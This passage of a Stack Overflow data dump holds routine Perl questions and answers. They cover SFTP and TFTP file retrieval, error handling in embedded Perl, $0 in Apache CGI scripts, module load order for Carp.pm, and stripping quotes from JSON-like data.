for your description you need to search a foreign host for some files and if they exist get them, if not add them in a file. One possible approach to your problem could be with <a href=\"http://search.cpan.org/~salva/Net-SFTP-Foreign-1.89/lib/Net/SFTP/Foreign.pm\" rel=\"nofollow noreferrer\">Net::SFTP::Foreign</a>. On my sample of code bellow I just search for the files in the dir and if I found the files that I want I add them in an array for further processing. In your case you can use get or something else, read the documentation of the module which is very very reach. </p>\n\n<p>Sample of code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Data::Dumper;\nuse Net::SFTP::Foreign;\n\nmy %args = ( host     =&gt; \"127.0.0.1\",\n             user     =&gt; \"user\",\n             port     =&gt; \"22\", # default 22\n             # psw    =&gt; \"psw\", # uncomment if you are using passwords\n             key_path =&gt; \"/home/user/.ssh/id_rsa\" ); # comment if you are using passwords\n\nmy $sftp = Net::SFTP::Foreign-&gt;new(%args);\n$sftp-&gt;die_on_error(\"Unable to establish SFTP connection\");\n\nmy $ls = $sftp-&gt;ls('/home/user/myTestDir/TestDir')\n    or die \"unable to retrieve directory: \".$sftp-&gt;error;\n\nmy @rest;\nmy @wanted;\nfor (@$ls) {\n    next if (substr($_-&gt;{filename},0,1) eq \".\"); # skip ('.' and '..')\n    if ($_-&gt;{filename} eq 'foo.txt'){\n    push @wanted, $_-&gt;{filename};\n    } else {\n    push @rest, $_-&gt;{filename};\n    }\n}\nprint Dumper \\@wanted, \\@rest;\n\n# do your stuff with the files\n\n__END__\n\n$ perl test.pl\n$VAR1 = [\n          'foo.txt'\n        ];\n$VAR2 = [\n          'bar.txt'\n        ];\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 6941451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/160df2085e91cf6719efd899babb57cb?s=128&d=identicon&r=PG&f=1", "display_name": "john mathik", "link": "https://stackoverflow.com/users/6941451/john-mathik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 223, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1521051553, "creation_date": 1521033521, "last_edit_date": 1521036099, "question_id": 49278821, "link": "https://stackoverflow.com/questions/49278821/get-file-with-nettftp-in-perl", "title": "Get file with Net::TFTP in Perl", "body": "<p>I want my code to do the following: if a certain file can be found on a server, I want to get it and save it to a text file. If it can't be found, I want to save to another text file.</p>\n\n<p>How can I do this?</p>\n\n<p>This is my code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse Net::TFTP;\n\nmy $server = \"192.168.1.1\";\nmy $file = \"image.bin\";\n\nmy $tftp = Net::TFTP-&gt;new(\"$server\");\n$tftp-&gt;octet;\n$tftp-&gt;get(\"$file\",\"$server-$file\");\n</code></pre>\n"}, {"tags": ["c", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1521028369, "post_id": 49276163, "comment_id": 85556448, "body": "It <i>might</i> help to include a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1521036553, "post_id": 49276163, "comment_id": 85562438, "body": "Check the return value of <code>perl_run()</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 379, "user_id": 4533661, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0c9c418921324d71b4d9b1380ab4990?s=128&d=identicon&r=PG&f=1", "display_name": "Semonit", "link": "https://stackoverflow.com/users/4533661/semonit"}, "edited": false, "score": 0, "creation_date": 1521206042, "post_id": 49287733, "comment_id": 85644381, "body": "Good idea! But i couldn&#39;t get <code>do</code> to be invoked via call_pv or call_argv. They give &quot;Undefind subroutine do called&quot; on STDERR. But anyway, I could do the trick with perl_eval."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 379, "user_id": 4533661, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0c9c418921324d71b4d9b1380ab4990?s=128&d=identicon&r=PG&f=1", "display_name": "Semonit", "link": "https://stackoverflow.com/users/4533661/semonit"}, "edited": false, "score": 0, "creation_date": 1521212835, "post_id": 49287733, "comment_id": 85649232, "body": "<code>do</code> is not a sub; it&#39;s an operator. It&#39;s actually <code>eval_sv</code> / <code>eval_pv</code> that you need if you want to use <code>do</code>."}, {"owner": {"reputation": 379, "user_id": 4533661, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0c9c418921324d71b4d9b1380ab4990?s=128&d=identicon&r=PG&f=1", "display_name": "Semonit", "link": "https://stackoverflow.com/users/4533661/semonit"}, "edited": false, "score": 0, "creation_date": 1521473636, "post_id": 49287733, "comment_id": 85734147, "body": "That&#39;s what I meant. I used <code>eval_pv</code> (&quot;wrongly&quot; said perl_eval)."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1521062633, "last_edit_date": 1521062633, "creation_date": 1521062070, "answer_id": 49287733, "question_id": 49276163, "link": "https://stackoverflow.com/questions/49276163/embedded-perl-in-c-is-there-a-flag-for-a-runitme-error-for-scripts-executed/49287733#49287733", "title": "embedded perl in c - is there a flag for a &quot;runitme error&quot; for scripts executed by perl_run()?", "body": "<p>You can catch exceptions thrown by code executed by <code>call_*</code>, so use the approach described in <a href=\"https://perldoc.perl.org/perlembed.html#Calling-a-Perl-subroutine-from-your-C-program\" rel=\"nofollow noreferrer\">Calling a Perl subroutine from your C program</a>, and refer to <a href=\"https://perldoc.perl.org/perlcall.html#G_EVAL\" rel=\"nofollow noreferrer\"><code>G_EVAL</code></a> in <a href=\"https://perldoc.perl.org/perlcall.html\" rel=\"nofollow noreferrer\">perlcall</a>. Use <a href=\"http://perldoc.perl.org/functions/do.html\" rel=\"nofollow noreferrer\"><code>do</code></a> from within the called code to get Perl to execute a file.</p>\n"}], "owner": {"reputation": 379, "user_id": 4533661, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0c9c418921324d71b4d9b1380ab4990?s=128&d=identicon&r=PG&f=1", "display_name": "Semonit", "link": "https://stackoverflow.com/users/4533661/semonit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 49287733, "answer_count": 1, "score": 2, "last_activity_date": 1521062633, "creation_date": 1521025701, "question_id": 49276163, "link": "https://stackoverflow.com/questions/49276163/embedded-perl-in-c-is-there-a-flag-for-a-runitme-error-for-scripts-executed", "title": "embedded perl in c - is there a flag for a &quot;runitme error&quot; for scripts executed by perl_run()?", "body": "<p>If a \"runtime error\" happens in a script that is executed by perl_run() in an embedded perl instance on C (actually C++11), is there a more reasonable way other than to look for \"Runtime error in...\" at the stderr stream? </p>\n\n<p>I'm using perl 5.26.1.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["apache", "perl"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 2, "creation_date": 1521020359, "post_id": 49273939, "comment_id": 85550847, "body": "Why do you need <code>$0</code> and what is it giving you that <code>$ENV{&quot;SCRIPT_NAME&quot;}</code> doesn&#39;t?"}, {"owner": {"reputation": 13, "user_id": 8856897, "user_type": "registered", "profile_image": "https://graph.facebook.com/1403146266378056/picture?type=large", "display_name": "Erikas Raginis", "link": "https://stackoverflow.com/users/8856897/erikas-raginis"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1521021371, "post_id": 49273939, "comment_id": 85551538, "body": "I&#39;ll test $ENV{&quot;SCRIPT_NAME&quot;}, but what i need is to understand why it behaves differently when it shouldn&#39;t."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 2, "creation_date": 1521022361, "post_id": 49273939, "comment_id": 85552240, "body": "why shouldn&#39;t it? <code>$0</code> is the filename that is passed to Perl to run. If you call a script with the full path, you&#39;ll get that, but you can also call it with a relative path and that&#39;s all you&#39;ll get too."}, {"owner": {"reputation": 13, "user_id": 8856897, "user_type": "registered", "profile_image": "https://graph.facebook.com/1403146266378056/picture?type=large", "display_name": "Erikas Raginis", "link": "https://stackoverflow.com/users/8856897/erikas-raginis"}, "reply_to_user": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 0, "creation_date": 1521024000, "post_id": 49273939, "comment_id": 85553429, "body": "I&#39;m calling them though the browser, why is it being called from root on one pc and from cgi-bin in another? that&#39;s what i want to find out"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1521024431, "post_id": 49273939, "comment_id": 85553713, "body": "No idea - you&#39;ll need to include the relevant parts of the Apache config for anyone to make an informed answer rather than guessing."}], "answers": [{"comments": [{"owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 1, "creation_date": 1521034467, "post_id": 49277335, "comment_id": 85560762, "body": "<a href=\"http://images.use.perl.org/use.perl.org/_Aristotle/journal/33995.html\" rel=\"nofollow noreferrer\">images.use.perl.org/use.perl.org/_Aristotle/journal/33995.ht&zwnj;&#8203;ml</a> <a href=\"https://metacpan.org/pod/Find::Lib\" rel=\"nofollow noreferrer\">metacpan.org/pod/Find::Lib</a>"}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "reply_to_user": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "edited": false, "score": 0, "creation_date": 1521050811, "post_id": 49277335, "comment_id": 85572585, "body": "@daxim Then use <code>$FindBin::RealBin</code> instead of <code>$FindBin::Bin</code>."}], "tags": [], "owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "is_accepted": false, "score": 1, "last_activity_date": 1521028979, "creation_date": 1521028979, "answer_id": 49277335, "question_id": 49273939, "link": "https://stackoverflow.com/questions/49273939/0-in-a-cgi-perl-script-behaves-differenty-in-var-www-html-and-public-html/49277335#49277335", "title": "$0 in a cgi perl script behaves differenty in /var/www/html and ~/public_html", "body": "<p>If you need to know where a script resides, use the module <a href=\"http://perldoc.perl.org/FindBin.html\" rel=\"nofollow noreferrer\"><code>FindBin</code></a>. <code>FindBin</code> is a standard module and comes installed with Perl. For a list of standard modules, see <a href=\"http://perldoc.perl.org/perlmodlib.html\" rel=\"nofollow noreferrer\"><code>perldoc perlmodlib</code></a>.</p>\n"}], "owner": {"reputation": 13, "user_id": 8856897, "user_type": "registered", "profile_image": "https://graph.facebook.com/1403146266378056/picture?type=large", "display_name": "Erikas Raginis", "link": "https://stackoverflow.com/users/8856897/erikas-raginis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1521028979, "creation_date": 1521019683, "question_id": 49273939, "link": "https://stackoverflow.com/questions/49273939/0-in-a-cgi-perl-script-behaves-differenty-in-var-www-html-and-public-html", "title": "$0 in a cgi perl script behaves differenty in /var/www/html and ~/public_html", "body": "<p>so i have this script try.pl:</p>\n\n<pre><code>#!/usr/bin/perl -T\n\nuse strict;\nuse warnings;\n\nprint \"content-type: text/plain\\n\";\nprint \"\\n\";\n\n$ENV{PATH} = \"/usr/bin:/usr/sbin\";\n\nmy $date = `/bin/date`;\n\nprint \"This is $0, now is $date \\n\";\n</code></pre>\n\n<p>in two locations: /vaw/www/html/website/cgi-bin/try.pl and /home/user/public_html/website/cgi-bin/try.pl\nDepending on which one i open, i get different results:\n/vaw/www/html/website/cgi-bin/try.pl gives me:</p>\n\n<pre><code>This is /var/www/html/website/cgi-bin/try.pl, now is Tue Mar 13 17:11:56 EET 2018\n</code></pre>\n\n<p>and /home/user/public_html/website/cgi-bin/try.pl gives me:</p>\n\n<pre><code>This is try.pl, now is Tue Mar 13 17:48:25 EET 2018\n</code></pre>\n\n<p>As you can see, the problem is that $0 only gives me the basename in public_html. I'll also add cgi-bin/.htaccess:</p>\n\n<pre><code>Options +ExecCGI -Indexes\nAddHandler cgi-script .pl\n\n&lt;Files ~ \"\\.(conf|config)$\"&gt;\n    Order allow,deny\n    Deny from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>Another test i did was on a different computer, and there $0 gave absolute path in both /var/www/html and public_html. Any ideas what could be causing this?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520983260, "post_id": 49267267, "comment_id": 85538200, "body": "What is the output of <code>which -a perl</code> and <code>perl -E&#39;say for @INC</code>? Please edit your question to include the new information."}, {"owner": {"reputation": 27351, "user_id": 559827, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/4aa6db921795b84b986eb4aac8ffd569?s=128&d=identicon&r=PG", "display_name": "kjo", "link": "https://stackoverflow.com/users/559827/kjo"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520986448, "post_id": 49267267, "comment_id": 85539169, "body": "@Borodin: thank you; in the process of answering your comment, I discovered a workaround; the question is now a mess; sorry about that; please feel free to ignore it."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520986951, "post_id": 49267267, "comment_id": 85539285, "body": "Your question is fine, but &quot;work-arounds&quot; are less than ideal. Remember that every page of <i>Stack Overflow</i> is most useful because it will help countless people beyond the OP. Please write an answer to your own question that describes your journey to success. You may accept your own answer after a delay of a few days."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1521001304, "post_id": 49267267, "comment_id": 85542569, "body": "Perl will go through <code>@INC</code> and use the first module found."}], "owner": {"reputation": 27351, "user_id": 559827, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/4aa6db921795b84b986eb4aac8ffd569?s=128&d=identicon&r=PG", "display_name": "kjo", "link": "https://stackoverflow.com/users/559827/kjo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 601, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1520986397, "creation_date": 1520982296, "last_edit_date": 1520986397, "question_id": 49267267, "link": "https://stackoverflow.com/questions/49267267/how-to-bypass-usr-share-perl5-carp-pm", "title": "How to bypass /usr/share/perl5/Carp.pm?", "body": "<p>I'm getting a cryptic error when I try to debug a Perl script:</p>\n\n<pre><code>% perl -d path/to/script.pl\nLoading DB routines from perl5db.pl version 1.32\nEditor support available.\n\nEnter h or `h h' for help, or `man perldebug' for more help.\n\nAttempt to reload Carp/Heavy.pm aborted.\nCompilation failed in require at /usr/share/perl5/Carp.pm line 33.\nDebugged program terminated.  Use q to quit or R to restart,\n  use o inhibit_exit to avoid stopping after program termination,\n  h q, h R or h o to get additional info.\n  DB&lt;1&gt; \n</code></pre>\n\n<p>I've come across other mentions of similar errors online, and there seems to be a problem with in the version of <code>Carp.pm</code> installed with Centos 6.</p>\n\n<p>At any rate, the version of <code>Carp</code> installed under <code>/usr/share/perl5</code> is 1.11, whereas the one that I have installed under <code>/my/local/lib/perl5</code> is 1.38.</p>\n\n<p>I don't have <code>/usr/share/perl5</code> anywhere in my <code>PERL5LIB</code> environment variable, whereas I do have <code>/my/local/lib/perl5</code> in it.  Still, no matter what I do, the <code>Carp</code> that I get when I attempt <code>use Carp</code> is the one under <code>/usr/share/perl5</code>, not the one under <code>/my/local/lib/perl5</code>.</p>\n\n<p>How can I have give <code>/my/local/lib/perl5</code> priority at the time of searching for <code>Carp.pm</code> and <code>Carp/Heavy.pm</code>?</p>\n\n<hr>\n\n<p><strong>EDIT:</strong> Per Borodin's comment</p>\n\n<pre><code>% which -a perl\n/usr/local/bin/perl\n/usr/bin/perl\n\n% perl -E 'say for @INC'\n/usr/local/lib64/perl5\n/usr/local/share/perl5\n/usr/lib64/perl5/vendor_perl\n/usr/share/perl5/vendor_perl\n/usr/lib64/perl5\n/usr/share/perl5\n.\n</code></pre>\n\n<p>The output above contradicts what I wrote in my original post; this is because the script in question is a CGI script that uses <code>use lib</code> to specify <code>/my/local/lib/perl5</code>.  It does this before any other <code>use &lt;PACKAGE&gt;;</code> statements, but this does not seem to help.</p>\n\n<p>In the process of collecting the info for this EDIT, I discovered that the error goes away if, in addition to the <code>use lib ...</code> statement within the code, I put <code>/my/local/lib/perl5</code> in <code>PERL5LIB</code> (I had originally stated).  This is not representative of what will happen when the script is run in production (as a CGI script), but at least it will allow me to debug it now.</p>\n"}, {"tags": ["string", "perl", "replace", "double-quotes"], "comments": [{"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 5, "creation_date": 1520970652, "post_id": 49264731, "comment_id": 85532844, "body": "Are you parsing JSON?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1520973677, "post_id": 49264731, "comment_id": 85534380, "body": "Use an existing JSON parser (e.g. Cpanel::JSON::XS) instead of trying to create your own."}, {"owner": {"reputation": 3102, "user_id": 1686626, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc855759fde692f7c1773b0968faaea7?s=128&d=identicon&r=PG", "display_name": "Reflective", "link": "https://stackoverflow.com/users/1686626/reflective"}, "edited": false, "score": 1, "creation_date": 1520977810, "post_id": 49264731, "comment_id": 85536185, "body": "<code>&quot;earnings&quot;:&quot;{\\&quot;29262\\&quot;:\\&quot;8.0595\\&quot;}&quot;</code> - this is not  string, a string could be this one <code>&quot;\\&quot;earnings&quot;:&quot;{\\&quot;29262\\&quot;:\\&quot;8.0595\\&quot;}\\&quot;&quot;</code> Can you provide your real string?"}, {"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520979086, "post_id": 49264731, "comment_id": 85536734, "body": "Not using JSON, just extracting the data I&#39;m given. Didn&#39;t know this was a JSON format actually. this will be a CGI on the web. I&#39;ll have to see if that parser is available."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520980499, "post_id": 49264731, "comment_id": 85537261, "body": "As others have said, it looks like this was intended to be JSON data. Of course you&#39;re not obliged to treat it as such, but you haven&#39;t shown a valid Perl string so it&#39;s impossible to even guess what a solution may be. Is this within CGI code? Please show a Perl program that reproduces the problem, including the definition of <code>@myArray</code> and the code you have used to dump its contents"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520980896, "post_id": 49264731, "comment_id": 85537403, "body": "I don&#39;t see how malformed data could hang a browser, but perhaps I&#39;m not being sufficiently imaginative. Are you simply experiencing the page becoming unresponsive, or do you have evidence that there is an endless JavaScript loop? Does it work if you remove the <code>tr&#47;&#47;&#47;</code>? You say that you want to remove the quotes, brackets and slashes, but your code removes only double quotes. How about removing all that you <i>don&#39;t</i> want with <code>tr&#47;0-9A-Za-z.:&#47;cd</code>?"}, {"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520982781, "post_id": 49264731, "comment_id": 85538045, "body": "When I set up a loop to remove the quotes from all the data, it will hang at the point where it hits this specific array element. I know because the browswer will &quot;load&quot; to halfway then stall and I&#39;ll get an error eventually that says it&#39;s using too much memory. If I limit the loop to run to just prior that element, it will finish properly and not hang. Code is very simple... &#39; my $data = &lt;REG&gt;;  close(REG);  my @myArray = split(&#39;,&#39;, $data);  for ($i=0; $i &lt;= @myArray.length; $i++) { \t$myArray[$i] =~ tr/&quot;//d; \tprint &quot;$myArray[$i]&lt;p&gt;\\n&quot;; } &#39;"}, {"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520983024, "post_id": 49264731, "comment_id": 85538127, "body": "data comes in like this. I have it save as a text file for testing...   {&quot;product_id&quot;:526280,&quot;price&quot;:9.01,&quot;country&quot;:&quot;US&quot;,&quot;currency&quot;:&zwnj;&#8203;&quot;USD&quot;,&quot;sale_gross&quot;:9&zwnj;&#8203;.01,&quot;p_tax_amount&quot;:0&zwnj;&#8203;,&quot;p_fee&quot;:0.9505,&quot;cou&zwnj;&#8203;pon_savings&quot;:0,&quot;earn&zwnj;&#8203;ings&quot;:&quot;{\\&quot;29262\\&quot;:\\&quot;&zwnj;&#8203;8.0595\\&quot;}&quot;,&quot;order_id&zwnj;&#8203;&quot;:3188422,&quot;p_coupon&quot;&zwnj;&#8203;:&quot;&quot;,&quot;p_used_price_ov&zwnj;&#8203;erride&quot;:true,&quot;passth&zwnj;&#8203;rough&quot;:&quot;Example passthrough&quot;,&quot;p_quantity&quot;:1,&quot;quantity&quot;:1}"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1520983612, "post_id": 49264731, "comment_id": 85538325, "body": "<code>@myArray.length</code> is not valid Perl"}, {"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "edited": false, "score": 0, "creation_date": 1520984477, "post_id": 49264731, "comment_id": 85538575, "body": "I changed it to my $size = @myArray;"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520988790, "post_id": 49264731, "comment_id": 85539735, "body": "<i>&quot;I changed it to <code>my $size = @myArray</code>&quot;</i> <b><i>Please always post your real code.</i></b> It is impossible to help you to debug code that you are constantly modifying."}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1521039562, "post_id": 49264731, "comment_id": 85564601, "body": "@MattJacob Just to be nitpicky, it&#39;s actually valid Perl, it just doesn&#39;t do what was expected. Perl interprets it as <code>scalar(@myArray) . length($_)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520988591, "post_id": 49267655, "comment_id": 85539685, "body": "That isn&#39;t necessary unless your Perl code is being executed in a strange way, perhaps via a call to the shell? Please resolve this, as many people will arrive here hoping for a solution to a similar problem. Please provide additional information, especially code and data, by editing your question. It is unreadable in comments."}], "tags": [], "owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/a437789b76684303e2918c0112b7a7d0?s=128&d=identicon&r=PG&f=1", "display_name": "user3499381", "link": "https://stackoverflow.com/users/3499381/user3499381"}, "is_accepted": false, "score": -1, "last_activity_date": 1520984706, "creation_date": 1520984706, "answer_id": 49267655, "question_id": 49264731, "link": "https://stackoverflow.com/questions/49264731/perl-string-replacing-quotes-causes-the-browser-to-hang/49267655#49267655", "title": "Perl string replacing quotes causes the browser to hang", "body": "<p>guess I just needed to escape the double quote. this seems to work:</p>\n\n<pre><code>$myArray[$i] =~ tr/\\\"//d;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 327, "user_id": 3499381, "user_type": "registered", "accept_rate": 30, "profile_image": 